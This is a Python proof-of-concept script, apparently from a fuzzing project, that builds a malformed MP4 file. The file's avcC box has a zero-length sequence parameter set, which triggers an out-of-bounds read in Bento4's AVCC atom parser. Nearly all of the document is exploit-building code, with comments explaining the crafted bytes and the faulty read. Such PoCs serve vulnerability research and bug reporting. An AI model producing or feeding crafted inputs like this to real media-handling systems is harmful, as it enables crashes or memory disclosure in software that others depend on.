#!/usr/bin/env python3
import struct
import os

poc_dir = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4AvccAtom_cpp"
output_file = os.path.join(poc_dir, "vuln_002.mp4")

def make_box(box_type, data=b''):
    if isinstance(box_type, str):
        box_type = box_type.encode('ascii')
    size = 8 + len(data)
    return struct.pack('>I4s', size, box_type) + data

def make_fullbox(box_type, version=0, flags=0, data=b''):
    return make_box(box_type, struct.pack('>I', (version << 24) | (flags & 0xFFFFFF)) + data)

# ftyp
ftyp = make_box('ftyp', b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom')

# avcC payload (8 bytes) crafted to trigger VULN 002:
#   payload[0]=0x01 → version=1 (passes version check)
#   payload[1]=0x4D → profile
#   payload[2]=0x40 → profile_compatibility
#   payload[3]=0x0A → level
#   payload[4]=0xFF → nalu_length_size field
#   payload[5]=0xE1 → reserved(0xE0) | num_seq_params=1
#   payload[6..7]=0x00 0x00 → seq_param_length=0 (zero-length param)
# After loop: cursor=8=payload_size → payload[8] OOB read at line 88
avcc_payload = bytes([
    0x01,  # version
    0x4D,  # profile
    0x40,  # profile_compatibility
    0x0A,  # level
    0xFF,  # nalu_length_size - 1 = 3 → size=4
    0xE1,  # 0xE0 | num_seq_params=1
    0x00, 0x00,  # seq_param_length = 0
])
assert len(avcc_payload) == 8  # payload_size = 16 - 8 = 8

avcc = make_box('avcC', avcc_payload)  # size=16
assert len(avcc) == 16

# avc1 visual sample entry
identity_matrix = struct.pack('>IIIIIIIII',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)

avc1_data = (
    b'\x00' * 6 +
    struct.pack('>H', 1) +                  # data_reference_index
    b'\x00' * 2 +                           # pre_defined
    b'\x00' * 2 +                           # reserved
    b'\x00' * 12 +                          # pre_defined[3]
    struct.pack('>HH', 320, 240) +          # width, height
    struct.pack('>II', 0x00480000, 0x00480000) +
    b'\x00' * 4 +
    struct.pack('>H', 1) +                  # frame_count
    b'\x00' * 32 +                          # compressorname
    struct.pack('>H', 0x0018) +             # depth
    struct.pack('>H', 0xFFFF) +             # pre_defined
    avcc
)
avc1 = make_box('avc1', avc1_data)

# stsd
stsd = make_fullbox('stsd', 0, 0, struct.pack('>I', 1) + avc1)

# stts, stsc, stsz, stco (empty)
stts = make_fullbox('stts', 0, 0, struct.pack('>I', 0))
stsc = make_fullbox('stsc', 0, 0, struct.pack('>I', 0))
stsz = make_fullbox('stsz', 0, 0, struct.pack('>II', 0, 0))
stco = make_fullbox('stco', 0, 0, struct.pack('>I', 0))

stbl = make_box('stbl', stsd + stts + stsc + stsz + stco)

vmhd = make_fullbox('vmhd', 0, 1, struct.pack('>H', 0) + b'\x00' * 6)
url  = make_fullbox('url ', 0, 1, b'')
dref = make_fullbox('dref', 0, 0, struct.pack('>I', 1) + url)
dinf = make_box('dinf', dref)
minf = make_box('minf', vmhd + dinf + stbl)

mdhd = make_fullbox('mdhd', 0, 0,
    struct.pack('>IIII', 0, 0, 1000, 0) +
    struct.pack('>HH', 0x55C4, 0))

hdlr = make_fullbox('hdlr', 0, 0,
    struct.pack('>I', 0) + b'vide' + b'\x00' * 12 + b'Video\x00')

mdia = make_box('mdia', mdhd + hdlr + minf)

tkhd = make_fullbox('tkhd', 0, 3,
    struct.pack('>IIIII', 0, 0, 1, 0, 0) +
    b'\x00' * 8 +
    struct.pack('>HHHH', 0, 0, 0x0100, 0) +
    identity_matrix +
    struct.pack('>II', 320 << 16, 240 << 16))

trak = make_box('trak', tkhd + mdia)

mvhd = make_fullbox('mvhd', 0, 0,
    struct.pack('>IIIII', 0, 0, 1000, 0, 0x00010000) +
    struct.pack('>H', 0x0100) +
    b'\x00' * 10 +
    identity_matrix +
    b'\x00' * 24 +
    struct.pack('>I', 2))

moov = make_box('moov', mvhd + trak)

mp4_data = ftyp + moov
with open(output_file, 'wb') as f:
    f.write(mp4_data)

print(f"Written {len(mp4_data)} bytes to {output_file}")
print(f"  avcC: size=16, payload[5]&31=1 (num_seq_params=1), payload[6:8]=0x0000 (len=0)")
print(f"  After loop: cursor=8=payload_size → payload[8] OOB read at line 88")
